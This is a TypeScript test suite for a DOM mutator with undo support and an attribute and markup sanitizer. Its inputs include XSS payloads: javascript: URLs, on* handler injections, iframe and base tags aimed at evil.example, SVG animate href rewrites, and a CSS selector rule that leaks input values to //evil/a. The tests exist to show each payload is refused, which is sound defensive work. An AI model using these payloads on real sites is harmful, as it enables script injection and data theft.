import { describe, expect, it } from 'vitest';
import { attrDenyReason, createMutator, MARKER_ATTR } from '@/dom/mutate';

const SHEET_ID = 'dz-designer-overrides';

function mount(html: string): void {
  document.documentElement.removeAttribute('style');
  document.head.innerHTML = '';
  document.body.innerHTML = html;
}

function byId(id: string): HTMLElement {
  const el = document.getElementById(id);
  if (!el) throw new Error(`fixture missing: #${id}`);
  return el;
}

function sheetText(): string {
  return document.getElementById(SHEET_ID)?.textContent ?? '';
}

describe('createMutator setStyle', () => {
  it('applies props via the injected sheet (never inline) and marks the element', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    createMutator(document).setStyle(el, { color: 'red', backgroundColor: 'blue' });

    const id = el.getAttribute(MARKER_ATTR);
    expect(id).toMatch(/^dz-\d+$/);
    expect(el.getAttribute('style')).toBeNull();
    expect(sheetText()).toContain(`[${MARKER_ATTR}="${id}"]`);
    expect(sheetText()).toContain('color: red !important');
    expect(sheetText()).toContain('background-color: blue !important'); // camelCase -> kebab
  });

  it('undo removes the rule and the marker', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    const mutation = createMutator(document).setStyle(el, { color: 'red' });
    mutation.undo();
    expect(el.hasAttribute(MARKER_ATTR)).toBe(false);
    expect(sheetText()).toBe('');
  });

  it('merges a second setStyle into one rule and unwinds to the first', () => {
    mount('<button id="cta">Buy</button>');
    const el = byId('cta');
    const mutator = createMutator(document);
    mutator.setStyle(el, { color: 'red' });
    const second = mutator.setStyle(el, { color: 'green', fontSize: '20px' });

    expect(sheetText()).toContain('color: green !important');
    expect(sheetText()).toContain('font-size: 20px !important');

    second.undo();
    expect(sheetText()).toContain('color: red !important'); // reverts to the first value
    expect(sheetText()).not.toContain('font-size'); // the prop second added is dropped
    expect(el.hasAttribute(MARKER_ATTR)).toBe(true); // first override still active
  });

  it('reports the applied value as computed', () => {
    mount('<button id="cta">Buy</button>');
    const mutation = createMutator(document).setStyle(byId('cta'), { color: 'rgb(1, 2, 3)' });
    expect(mutation.computed.color).toBe('rgb(1, 2, 3)');
    expect(mutation.kind).toBe('setStyle');
    expect(mutation.ruleId).toMatch(/^dz-\d+$/);
  });
});

describe('createMutator setText / setAttr', () => {
  it('setText replaces text and undo restores it', () => {
    mount('<p id="t">before</p>');
    const el = byId('t');
    const mutation = createMutator(document).setText(el, 'after');
    expect(el.textContent).toBe('after');
    expect(mutation.before).toBe('before');
    mutation.undo();
    expect(el.textContent).toBe('before');
  });

  it('setText round-trips child structure on undo (not just flattened text)', () => {
    mount('<p id="t">Hello <b>world</b><i>!</i></p>');
    const el = byId('t');
    const mutation = createMutator(document).setText(el, 'replaced');

    expect(el.textContent).toBe('replaced');
    expect(el.children).toHaveLength(0); // visible text replaced
    expect(mutation.before).toBe('Hello <b>world</b><i>!</i>'); // full markup captured, not lossy
    mutation.undo();
    expect(el.innerHTML).toBe('Hello <b>world</b><i>!</i>'); // structure restored, not collapsed
    expect(el.querySelector('b')?.textContent).toBe('world');
  });

  it('setAttr adds a new attribute and undo removes it', () => {
    mount('<a id="l">x</a>');
    const el = byId('l');
    const mutation = createMutator(document).setAttr(el, 'href', '/home');
    expect(el.getAttribute('href')).toBe('/home');
    mutation.undo();
    expect(el.hasAttribute('href')).toBe(false);
  });

  it('setAttr restores a prior attribute value on undo', () => {
    mount('<a id="l" href="/old">x</a>');
    const el = byId('l');
    const mutation = createMutator(document).setAttr(el, 'href', '/new');
    expect(el.getAttribute('href')).toBe('/new');
    mutation.undo();
    expect(el.getAttribute('href')).toBe('/old');
  });

  it('setAttr records the attribute name in the event (self-describing, like setStyle)', () => {
    mount('<a id="l" href="/old">x</a>');
    const m = createMutator(document).setAttr(byId('l'), 'href', '/new');
    // before/after carry the name so #9/#10 can reconstruct WHICH attribute changed, not just its value.
    expect(JSON.parse(m.before)).toEqual({ href: '/old' });
    expect(JSON.parse(m.after)).toEqual({ href: '/new' });
  });

  it('setAttr encodes an absent prior attribute as null', () => {
    mount('<a id="l">x</a>');
    const m = createMutator(document).setAttr(byId('l'), 'data-x', '1');
    expect(JSON.parse(m.before)).toEqual({ 'data-x': null });
    expect(JSON.parse(m.after)).toEqual({ 'data-x': '1' });
  });

  it('setAttr throws on a denied write and does not touch the DOM (safe at source)', () => {
    mount('<a id="l">x</a>');
    const el = byId('l');
    const mutator = createMutator(document);
    expect(() => mutator.setAttr(el, 'onclick', 'steal()')).toThrow(/event handler/);
    expect(() => mutator.setAttr(el, 'href', 'javascript:alert(1)')).toThrow(/javascript:/);
    expect(() => mutator.setAttr(el, 'src', 'https://cdn/x.js')).toThrow(/remote resource/);
    expect(el.hasAttribute('onclick')).toBe(false);
    expect(el.hasAttribute('src')).toBe(false);
    expect(el.hasAttribute('href')).toBe(false);
  });
});

describe('attrDenyReason (setAttr security deny-list)', () => {
  it('allows safe attribute writes', () => {
    expect(attrDenyReason('href', '/home')).toBeNull();
    expect(attrDenyReason('href', 'https://example.com')).toBeNull();
    expect(attrDenyReason('data-id', '42')).toBeNull(); // data-* is not the bare `data` attr
    expect(attrDenyReason('alt', 'a photo')).toBeNull();
    // `javascript:` is inert in a non-navigational attribute, so it must NOT false-refuse legit copy.
    expect(attrDenyReason('alt', 'JavaScript: The Good Parts')).toBeNull();
    expect(attrDenyReason('title', 'javascript: a language')).toBeNull();
    expect(attrDenyReason('title', 'javascript is a language')).toBeNull();
  });

  it('refuses on* event-handler attributes regardless of casing', () => {
    expect(attrDenyReason('onclick', 'x()')).toContain('event handler');
    expect(attrDenyReason('OnError', 'x()')).toContain('event handler');
    expect(attrDenyReason('onmouseover', 'x()')).toBeTruthy();
  });

  it('refuses the remote-load / framed-script attribute names outright', () => {
    expect(attrDenyReason('src', 'https://cdn.example/x.js')).toContain('remote resource');
    expect(attrDenyReason('SRC', '/local.png')).toBeTruthy(); // case-insensitive
    expect(attrDenyReason('srcset', 'https://cdn/x.png 2x')).toBeTruthy();
    expect(attrDenyReason('poster', 'https://cdn/p.png')).toBeTruthy();
    expect(attrDenyReason('ping', 'https://track/beacon')).toBeTruthy();
    expect(attrDenyReason('data', 'https://evil/x.html')).toBeTruthy(); // <object data> runs framed JS
    expect(attrDenyReason('srcdoc', '<script>x()</script>')).toContain('inject');
  });

  it('refuses writes to the internal setStyle marker', () => {
    expect(attrDenyReason(MARKER_ATTR, 'dz-99')).toContain('reserved');
  });

  it('refuses javascript: URLs in navigational attributes (whitespace/control-char tolerant)', () => {
    expect(attrDenyReason('href', 'javascript:alert(1)')).toContain('javascript:');
    expect(attrDenyReason('href', '  JavaScript:alert(1)')).toBeTruthy(); // leading ws + casing
    expect(attrDenyReason('href', 'java\tscript:alert(1)')).toBeTruthy(); // embedded control char
    expect(attrDenyReason('xlink:href', 'javascript:x')).toBeTruthy();
    expect(attrDenyReason('formaction', 'javascript:x')).toBeTruthy();
    expect(attrDenyReason('action', 'javascript:x')).toBeTruthy();
  });
});

describe('createMutator class toggles', () => {
  it('addClass adds a new class and undo removes it', () => {
    mount('<div id="d"></div>');
    const el = byId('d');
    const mutation = createMutator(document).addClass(el, 'hero');
    expect(el.classList.contains('hero')).toBe(true);
    mutation.undo();
    expect(el.classList.contains('hero')).toBe(false);
  });

  it('addClass undo keeps a class that already existed', () => {
    mount('<div id="d" class="hero"></div>');
    const el = byId('d');
    createMutator(document).addClass(el, 'hero').undo();
    expect(el.classList.contains('hero')).toBe(true);
  });

  it('removeClass removes a class and undo restores it', () => {
    mount('<div id="d" class="a b"></div>');
    const el = byId('d');
    const mutation = createMutator(document).removeClass(el, 'b');
    expect(el.classList.contains('b')).toBe(false);
    mutation.undo();
    expect(el.classList.contains('b')).toBe(true);
  });

  it('removeClass undo does not add a class that was never present', () => {
    mount('<div id="d" class="a"></div>');
    const el = byId('d');
    createMutator(document).removeClass(el, 'ghost').undo();
    expect(el.classList.contains('ghost')).toBe(false);
  });
});

describe('createMutator structural edits', () => {
  it('insertNode inserts and undo removes', () => {
    mount('<ul id="list"><li>one</li></ul>');
    const ref = byId('list');
    const mutation = createMutator(document).insertNode(ref, '<li>two</li>', 'beforeend');
    expect(ref.querySelectorAll('li')).toHaveLength(2);
    expect(mutation.computed.html).toBe('<li>two</li>');
    mutation.undo();
    expect(ref.querySelectorAll('li')).toHaveLength(1);
  });

  it('insertNode inserts EVERY top-level node and undo removes them all', () => {
    mount('<ul id="list"><li>one</li></ul>');
    const ref = byId('list');
    const mutation = createMutator(document).insertNode(
      ref,
      '<li>two</li><li>three</li>',
      'beforeend',
    );
    expect(ref.querySelectorAll('li')).toHaveLength(3); // both siblings inserted, not just the first
    expect(mutation.after).toBe('<li>two</li><li>three</li>'); // full set serialized
    mutation.undo();
    expect(ref.querySelectorAll('li')).toHaveLength(1);
  });

  it('insertNode inserts a bare text node without wrapping it in a span', () => {
    mount('<p id="p">Hi </p>');
    const ref = byId('p');
    const mutation = createMutator(document).insertNode(ref, 'there', 'beforeend');
    expect(ref.querySelector('span')).toBeNull(); // no phantom wrapper
    expect(ref.textContent).toBe('Hi there');
    mutation.undo();
    expect(ref.textContent).toBe('Hi ');
  });

  it('insertNode strips inline on* handlers from imported markup (CSP-safe)', () => {
    mount('<div id="host"></div>');
    const ref = byId('host');
    createMutator(document).insertNode(
      ref,
      '<img src="x" onerror="window.__pwned=1" onload="1">',
      'beforeend',
    );
    const img = ref.querySelector('img');
    expect(img?.hasAttribute('onerror')).toBe(false);
    expect(img?.hasAttribute('onload')).toBe(false);
    // Behavior changed deliberately (#58 review, MAJOR-1): the sanitizer now applies setAttr's
    // deny-list uniformly, so a remote-loading `src` is refused too — otherwise insertNode would
    // trivially bypass setAttr('src', …)'s refusal.
    expect(img?.getAttribute('src')).toBeNull();
  });

  it('moveNode relocates and undo restores the original position', () => {
    mount('<div id="a"><span id="s">x</span></div><div id="b"></div>');
    const [s, a, b] = [byId('s'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(s, b, 'beforeend');
    expect(b.contains(s)).toBe(true);
    expect(a.contains(s)).toBe(false);
    mutation.undo();
    expect(a.contains(s)).toBe(true);
    expect(b.contains(s)).toBe(false);
  });

  it('removeNode removes and undo re-inserts at the same spot', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const list = byId('list');
    const mutation = createMutator(document).removeNode(byId('x'));
    expect(document.getElementById('x')).toBeNull();
    mutation.undo();
    expect(Array.from(list.querySelectorAll('li')).map((li) => li.id)).toEqual(['x', 'y']);
  });
});

describe('createMutator page ops', () => {
  it('injectCss appends a stylesheet and undo removes it', () => {
    mount('<div></div>');
    const mutation = createMutator(document).injectCss('.x{color:red}');
    expect(document.querySelectorAll('style.dz-designer-injected')).toHaveLength(1);
    mutation.undo();
    expect(document.querySelectorAll('style.dz-designer-injected')).toHaveLength(0);
  });

  it('setViewport constrains the document width and undo restores prior style', () => {
    mount('<div></div>');
    const root = document.documentElement;
    const mutation = createMutator(document).setViewport({ width: 375 });
    expect(root.style.getPropertyValue('max-width')).toBe('375px');
    expect(mutation.computed).toEqual({ width: 375, height: null });
    mutation.undo();
    expect(root.style.getPropertyValue('max-width')).toBe('');
  });
});

describe('createMutator structural undo anchors (#58)', () => {
  it('removeNode undo restores the SAME node object (identity, not an equal clone)', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const x = byId('x');
    const mutation = createMutator(document).removeNode(x);
    mutation.undo();
    expect(document.getElementById('x')).toBe(x);
  });

  it('moveNode undo restores the original anchor with a same-tag sibling present (an index restore would fail)', () => {
    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
    expect(b.contains(one)).toBe(true);
    mutation.undo();
    expect(a.contains(one)).toBe(true);
    expect(one.nextSibling).toBe(two); // restored at the anchor, not "index 0"
  });
});

describe('insertNode markup sanitizer (#58 review)', () => {
  it('drops framed-document and document-hijack tags outright', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<p id="ok">ok</p><iframe src="https://evil.example"></iframe><object data="x"></object>' +
        '<embed src="x"><base href="https://evil.example/"><meta http-equiv="refresh" content="0">' +
        '<link rel="stylesheet" href="https://evil.example/x.css"><script>window.x=1</' +
        'script>',
      'beforeend',
    );
    expect(document.getElementById('ok')).not.toBeNull();
    for (const tag of ['iframe', 'object', 'embed', 'base', 'meta', 'link', 'script'])
      expect(document.querySelector(tag), tag).toBeNull();
  });

  it('runs every attribute through the setAttr deny-list (srcdoc/src/javascript:/marker all die)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      `<a id="a" href="javascript:alert(1)" onclick="alert(2)" ${MARKER_ATTR}="dz-99">x</a>` +
        '<img id="i" src="https://evil.example/x.png" alt="pic">',
      'beforeend',
    );
    const a = document.getElementById('a');
    expect(a?.getAttribute('href')).toBeNull();
    expect(a?.getAttribute('onclick')).toBeNull();
    expect(a?.getAttribute(MARKER_ATTR)).toBeNull();
    // uniform with setAttr: plain remote loads are refused too — mockups are described, not hotlinked
    expect(document.getElementById('i')?.getAttribute('src')).toBeNull();
    expect(document.getElementById('i')?.getAttribute('alt')).toBe('pic');
  });

  it('sanitizes INSIDE nested <template> content (page JS could clone it live later)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<template id="tpl"><span onclick="alert(1)">inner</span><iframe src="https://evil.example"></iframe></template>',
      'beforeend',
    );
    const tpl = document.getElementById('tpl') as HTMLTemplateElement;
    expect(tpl.content.querySelector('span')?.getAttribute('onclick')).toBeNull();
    expect(tpl.content.querySelector('iframe')).toBeNull();
  });
});

describe('structural undo under page churn (#58 review)', () => {
  it('removeNode undo throws honestly when the anchor sibling was churned away', () => {
    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
    const y = byId('y');
    const mutation = createMutator(document).removeNode(byId('x'));
    y.remove(); // page-side churn the recorder knows nothing about (SPA re-render)
    expect(() => mutation.undo()).toThrow(/original location changed/);
  });

  it('removeNode undo throws when the whole parent was detached (no silent invisible restore)', () => {
    mount('<section id="wrap"><ul id="list"><li id="x">x</li></ul></section>');
    const mutation = createMutator(document).removeNode(byId('x'));
    byId('wrap').remove(); // the parent is now in a detached subtree
    expect(() => mutation.undo()).toThrow(/original location changed/);
  });

  it('moveNode undo restores the anchor after a concurrent shift (the case an index restore fails)', () => {
    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
    // Unrecorded concurrent mutation: a NEW first child appears in the original parent. An
    // index-based restore would put #one before the NEW node; the anchor restore puts it before #two.
    a.insertBefore(document.createElement('span'), two);
    mutation.undo();
    expect(a.contains(one)).toBe(true);
    expect(one.nextSibling).toBe(two);
  });
});

describe('insertNode sanitizer residuals (#144 round-3 review)', () => {
  it('drops SMIL animation tags (they can rewrite href to javascript: AFTER insertion)', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg id="s" viewBox="0 0 10 10"><a href="?"><animate attributeName="href" values="javascript:alert(1)"/>' +
        '<set attributeName="href" to="javascript:alert(1)"/><circle r="2">' +
        '<animateMotion path="M0,0 L1,1"/><animateTransform attributeName="transform"/>' +
        '</circle></svg>',
      'beforeend',
    );
    const svg = document.getElementById('s');
    expect(svg).not.toBeNull(); // the SVG itself is legit design markup
    for (const tag of ['animate', 'set', 'animateMotion', 'animateTransform'])
      expect(svg?.querySelector(tag), tag).toBeNull();
  });

  it("drops <style> elements (page-wide CSS is beyond setStyle's scoped grant)", () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<p id="ok" style="color: red">ok</p><style>input[value^="a"]{background:url(//evil/a)}</style>',
      'beforeend',
    );
    expect(document.getElementById('ok')).not.toBeNull();
    expect(document.getElementById('ok')?.getAttribute('style')).toBe('color: red'); // inline style stays
    expect(document.querySelector('style')).toBeNull();
  });

  it('refuses remote http(s) href on SVG image/use, keeps data: and fragment refs', () => {
    mount('<div id="host"></div>');
    createMutator(document).insertNode(
      byId('host'),
      '<svg><image id="img" href="https://evil.example/beacon.png"/>' +
        '<image id="img2" href="data:image/png;base64,AAA"/>' +
        '<use id="u" href="#local-shape"/></svg>',
      'beforeend',
    );
    expect(document.getElementById('img')?.getAttribute('href')).toBeNull();
    expect(document.getElementById('img2')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
    expect(document.getElementById('u')?.getAttribute('href')).toBe('#local-shape');
  });
});
